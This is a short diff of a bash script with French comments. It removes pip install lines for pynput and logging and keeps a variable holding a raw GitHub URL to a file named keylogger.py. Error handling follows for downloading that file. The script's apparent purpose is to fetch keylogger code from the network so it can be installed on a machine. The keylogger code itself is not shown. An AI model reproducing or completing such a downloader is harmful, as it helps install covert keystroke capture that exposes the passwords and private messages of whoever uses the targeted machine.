@@ -1,11 +1,4 @@
 #!/bin/bash
-pip install pynput
-pip install logging #installation de la librairie logging
-pip install pynput #installation de la librairie pynput
-
-
-
-
 
 # URL du fichier Python sur GitHub
 GITHUB_URL="https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/scriptKeylogger/keylogger.py"
@@ -24,7 +17,6 @@ else
     echo "Erreur lors du téléchargement du fichier $FILENAME."
     exit 1
 fi
-
 
 
 
